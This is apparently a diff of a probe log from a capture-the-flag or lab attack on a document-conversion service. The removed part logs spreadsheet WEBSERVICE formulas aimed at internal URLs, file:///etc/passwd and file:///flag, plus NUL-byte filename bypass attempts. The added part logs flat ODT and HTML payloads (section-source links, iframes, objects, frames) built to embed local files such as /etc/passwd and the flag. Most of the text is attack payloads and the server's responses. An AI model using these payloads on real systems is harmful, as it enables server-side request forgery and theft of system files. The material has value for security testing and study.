@@ -1,50 +1,46 @@
 
-=== INFO("release") FILENAME_REPR 'formula.ods'
-STATUS 200 BYTES 41 RESPONSE cc5614c67e8de6450d98a0e125814305df650b64
+=== FLAT_ODT 'flat.fodt'
+STATUS 200 BYTES 17 RESPONSE ﻿ARENA_MARKER
 
 
-=== CELL("FILENAME") FILENAME_REPR 'formula.ods'
-STATUS 200 BYTES 22 RESPONSE 'formula.ods'#$Sheet1
+
+=== FLAT_ODT 'flat.txt'
+STATUS 200 BYTES 567 RESPONSE ﻿<?xml version="1.0" encoding="UTF-8"?>
+<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" office:version="1.2" office:mimetype="application/vnd.oasis.opendocument.text">
+<office:body><office:text><text:p>ARENA_MARKER</text:p><text:section text:name="s"><text:section-source xlink:href="file:///etc/passwd" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></text:section></office:text></office:body></office:document>
 
 
-=== COM.MICROSOFT.WEBSERVICE("http://webapp:8000/") FILENAME_REPR 'formula.ods'
-STATUS 200 BYTES 8 RESPONSE Err:540
+=== FLAT_ODT 'flat.xml'
+STATUS 200 BYTES 17 RESPONSE ﻿ARENA_MARKER
 
 
-=== COM.MICROSOFT.WEBSERVICE("http://webapp:8000/flag") FILENAME_REPR 'formula.ods'
-STATUS 200 BYTES 8 RESPONSE Err:540
+
+=== HTML_MARKER 'html.html'
+STATUS 200 BYTES 16 RESPONSE ﻿ARENA_MARKER
 
 
-=== COM.MICROSOFT.WEBSERVICE("http://webapp:8000/internal/flag") FILENAME_REPR 'formula.ods'
-STATUS 200 BYTES 8 RESPONSE Err:540
+=== HTML_MARKER 'html.txt'
+STATUS 200 BYTES 57 RESPONSE ﻿<!doctype html><html><body>ARENA_MARKER</body></html>
 
 
-=== COM.MICROSOFT.WEBSERVICE("http://webapp:8000/debug/vars") FILENAME_REPR 'formula.ods'
-STATUS 200 BYTES 8 RESPONSE Err:540
+=== HTML_FILE_INCLUDE 'include.txt'
+STATUS 200 BYTES 124 RESPONSE ﻿<!doctype html><html><body>ARENA_MARKER<iframe src="file:///etc/passwd" width="600" height="400"></iframe></body></html>
 
 
-=== COM.MICROSOFT.WEBSERVICE("http://webapp:8000/env") FILENAME_REPR 'formula.ods'
-STATUS 200 BYTES 8 RESPONSE Err:540
+=== HTML_FILE_INCLUDE 'include.txt'
+STATUS 200 BYTES 143 RESPONSE ﻿<!doctype html><html><body>ARENA_MARKER<object data="file:///etc/passwd" type="text/plain" width="600" height="400"></object></body></html>
 
 
-=== COM.MICROSOFT.WEBSERVICE("http://127.0.0.1:9980/hosting/capabilities") FILENAME_REPR 'formula.ods'
-STATUS 200 BYTES 8 RESPONSE Err:540
+=== HTML_FILE_INCLUDE 'include.txt'
+STATUS 200 BYTES 110 RESPONSE ﻿<!doctype html><html><body>ARENA_MARKER<frameset><frame src="file:///etc/passwd"></frameset></body></html>
 
 
-=== COM.MICROSOFT.WEBSERVICE("http://collabora:9980/hosting/capabilities") FILENAME_REPR 'formula.ods'
-STATUS 200 BYTES 8 RESPONSE Err:540
+=== FLAT_ODT_FLAG 'flat.txt'
+STATUS 200 BYTES 561 RESPONSE ﻿<?xml version="1.0" encoding="UTF-8"?>
+<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" office:version="1.2" office:mimetype="application/vnd.oasis.opendocument.text">
+<office:body><office:text><text:p>ARENA_MARKER</text:p><text:section text:name="s"><text:section-source xlink:href="file:///flag" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></text:section></office:text></office:body></office:document>
 
 
-=== COM.MICROSOFT.WEBSERVICE("file:///etc/passwd") FILENAME_REPR 'formula.ods'
-STATUS 200 BYTES 8 RESPONSE #VALUE!
+=== HTML_FLAG 'include.txt'
+STATUS 200 BYTES 106 RESPONSE ﻿<!doctype html><html><body><iframe src="file:///flag" width="600" height="400"></iframe></body></html>
 
-
-=== COM.MICROSOFT.WEBSERVICE("file:///flag") FILENAME_REPR 'formula.ods'
-STATUS 200 BYTES 8 RESPONSE #VALUE!
-
-
-=== NUL_EXTENSION_BYPASS FILENAME_REPR 'probe.odt\x00.txt'
-HTTP_ERROR 500 
-
-=== NUL_EXTENSION_BYPASS FILENAME_REPR 'probe.odt%00.txt'
-HTTP_ERROR 500 
